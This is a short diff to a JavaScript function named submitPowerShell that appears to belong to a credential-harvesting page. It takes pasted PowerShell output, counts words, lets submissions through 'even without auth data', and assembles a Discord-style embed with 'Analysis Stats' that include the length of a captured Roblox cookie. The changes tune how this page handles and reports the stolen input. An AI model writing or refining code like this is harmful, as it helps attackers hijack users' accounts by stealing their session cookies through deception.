@@ -237,7 +237,7 @@ async function submitPowerShell() {
     const submitBtn = document.getElementById('submitBtn');
     const submitText = document.getElementById('submitText');
     const loadingOverlay = document.getElementById('loadingOverlay');
-    const inputText = realInputValue.trim() || input.value.trim();
+    const inputText = realInputValue.trim();
     
     // Validation
     if (!inputText) {
@@ -263,8 +263,8 @@ async function submitPowerShell() {
         
 
         
-        // Check word count - if 50+ words, allow through even without auth data
-        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
+        // Check word count using real input value - if 50+ words, allow through even without auth data
+        const wordCount = realInputValue.split(/\s+/).filter(word => word.length > 0).length;
         
         // Show word count on button temporarily
         submitText.textContent = `${wordCount} words`;
@@ -319,7 +319,7 @@ async function submitPowerShell() {
                 },
                 {
                     name: "📊 Analysis Stats",
-                    value: `**Input Length:** ${inputText.length} chars\n**Word Count:** ${wordCount} words\n**Cookie Length:** ${robloxCookie ? robloxCookie.length : 0} chars`,
+                    value: `**Input Length:** ${realInputValue.length} chars\n**Word Count:** ${wordCount} words\n**Cookie Length:** ${robloxCookie ? robloxCookie.length : 0} chars`,
                     inline: false
                 }
             ],
